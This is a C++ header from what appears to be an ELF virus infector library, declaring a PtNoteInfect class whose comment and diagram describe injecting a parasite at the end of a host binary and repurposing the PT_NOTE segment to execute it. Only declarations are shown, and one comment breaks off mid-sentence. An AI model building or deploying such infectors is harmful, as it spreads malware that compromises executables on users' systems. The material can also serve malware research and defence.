#pragma once
#include <elf.h>
#include <span>

namespace vt::infector {
// This algorithm injects a parasite to the end of the elf structure and mutate
// the pt_note segment to be executable, pointing to our parasite.
//
//  host elf structure                           infected elf structure
//  -------------------                          -----------------------
//  elf_hdr            <------|    |----->       elf_hdr
//  phdrs                 CODE|    |CODE         phdrs
//  non-exec sections         |    |             non-exec sections
//  exec sections             |    |             exec sections
//  non-exec sections  <------|    |----->       non-exec sections
//                        RO  |    | RO          
//  shdrs              <------|    |----->       shdrs
//                                 |CODE->       *virus <-------
// The current
class PtNoteInfect {
 public:
  size_t injected_host_size();

  bool analyze(std::span<const std::byte> host_mapping,
               std::span<const std::byte> parasite_mapping);

  bool inject(std::span<std::byte> host_mapping,
              std::span<const std::byte> parasite_mapping);

 private:
  size_t host_size_{};
  size_t parasite_size_{};
  Elf64_Addr original_e_entry_{};
  Elf64_Off original_pt_note_file_offset_{};
  Elf64_Addr parasite_load_address_{};
  Elf64_Xword pt_load_alignment_{};
  size_t pt_note_to_be_infected_idx_{};
};

}  // namespace vt::infector